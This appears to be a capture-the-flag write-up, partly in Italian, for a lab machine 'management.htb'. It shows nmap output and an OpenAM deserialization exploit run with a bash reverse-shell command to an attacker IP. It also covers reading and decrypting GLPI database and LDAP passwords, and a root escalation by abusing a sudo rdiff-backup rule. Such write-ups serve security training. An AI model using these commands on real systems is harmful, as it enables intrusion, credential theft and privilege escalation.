# WriteUpManagment.htb
```bash
# Nmap 7.98 scan initiated Thu Sep 17 18:01:49 2026 as: nmap -sC -sV -p22,80,443,1689,4444,37363,50389 -oN target 10.129.136.195
Nmap scan report for management.htb (10.129.136.195)
Host is up (0.15s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://management.htb/
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Management \xE2\x80\x94 Managed IT &amp; Infrastructure
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
|_http-server-header: nginx/1.24.0 (Ubuntu)
1689/tcp  open  java-rmi Java RMI
| rmi-dumpregistry: 
|   org.opends.server.protocols.jmx.client-unknown
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:37363
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
4444/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   LDAPSearchReq: 
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
37363/tcp open  java-rmi Java RMI
50389/tcp open  ldap     (Anonymous bind OK)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.98%T=SSL%I=7%D=9/17%Time=6AAC0F2E%P=x86_64-pc-linux-gn
SF:u%r(LDAPSearchReq,55,"0E\x02\x01\x07d@\x04\x000<0:\x04\x0bobjectClass1\
SF:+\x04\x03top\x04\x0bds-root-dse\x04\x17ds-cfg-root-dse-backend0\x0c\x02
SF:\x01\x07e\x07\n\x01\0\x04\0\x04\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 17 18:03:02 2026 -- 1 IP address (1 host up) scanned in 73.17 seconds
```
```bash
/assets              [36m (Status: 301)[0m [Size: 178][34m [--> https://management.htb/assets/][0m
```
# Dopo una ricerca su OpenAm Spunta un CVE:-> CVE-2026-33439. su:-> `https://www.csipiemonte.it/it/notizia-csirt/openam-cve-2026-33439-rce-pre-autenticazione-via-deserializzazione-java-exploit`
```bash
+ python3 exploit.py --url https://sso.management.htb --method POST --command "bash -c bash -i >& /dev/tcp/10.10.XX.XX/4444 0>&1"

+ ❯ nc -lvnp 4444
+ Listening on 0.0.0.0 4444

+ openam@management:/opt$ whoami
+ openam

```
### Enumeration System `cd /opt/`
```bash
openam@management:$ find \. -name "config*"
./glpi/front/config.form.php
./glpi/config
./glpi/config/config_db.php
cd glpi/config && ls
config_db.php  glpicrypt.key  oauth.pem  oauth.pub
openam@management:/opt/glpi/config$ cat config_db.php 
<?php
class DB extends DBmysql {
   public $dbhost = 127.0.0.1;
   public $dbuser = glpi;
   public $dbpassword = 8rhu0L6Pw4Y7;
   public $dbdefault = glpidb;
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}

<?php
define("GLPI_CONFIG_DIR", "/opt/glpi/config");
require "/opt/glpi/vendor/autoload.php";
require "/opt/glpi/src/GLPIKey.php";

$glpikey = new GLPIKey();
$enc     = "avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==";
$pass    = $glpikey->decrypt($enc);

echo "
";
echo "[+] GLPI LDAP bind password decrypted
";
echo "    passwd  : $pass
";
echo "
";
php decript*

[+] GLPI LDAP bind password decrypted
    passwd  : Wpc40GhT..

openam@management:/tmp$ 
```
```bash
openam@management:/tmp$ ssh owen@127.0.0.1
The authenticity of host 127.0.0.1 (127.0.0.1) can t be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 127.0.0.1 (ED25519) to the list of known hosts.
owen@127.0.0.1 s password: 
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Sep 18 12:19:41 AM UTC 2026

  System load:           0.06
  Usage of /:            45.9% of 10.42GB
  Memory usage:          49%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.137.34
  IPv6 address for eth0: dead:beef::a0de:adff:fef0:614a


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Sep 18 00:19:43 2026 from 127.0.0.1
owen@management:~$ ls
user.txt
owen@management:~$ cat user.txt 
0ed29XXXXXXXXXXXXXXXXXXXXXXXX
owen@management:~$ 
```
### Privilege Escalation
```bash
owen@management:~$ sudo -l 
Matching Defaults entries for owen on management:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
owen@management:~$ 
rdiff-backup --remote-schema sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s backup /::/root /tmp/rootbak
```
```bash
cd rootbak/
owen@management:/tmp/rootbak$ ls
rdiff-backup-data  root.txt
owen@management:/tmp/rootbak$ cat root.txt 
1cXXXXXXXXXXXXXXXXXXXXXXXXXX
owen@management:/tmp/rootbak$
```
# Finish
